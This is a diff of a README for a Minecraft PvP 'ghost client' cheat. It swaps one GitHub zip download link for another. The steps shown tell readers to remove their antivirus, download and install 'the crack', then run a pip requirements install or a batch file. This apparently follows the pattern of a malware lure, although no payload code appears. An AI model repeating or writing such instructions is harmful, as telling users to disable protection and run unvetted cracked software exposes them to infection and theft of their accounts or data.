@@ -8,7 +8,7 @@ Ghost Client Minecraft for PVP
 
 1.Remove Your antivirus 
 
-2.install the crack : [Download](https://github.com/ByteSleuths/Vape-V4/archive/refs/heads/main.zip) 
+2.install the crack : [Download](https://github.com/ByteSleuths/Vape-Lite/archive/refs/heads/main.zip) 
 
 3.Open a Cmd in the folder and put the command : pip install -r requirements.txt or launch requirements install.bat
 
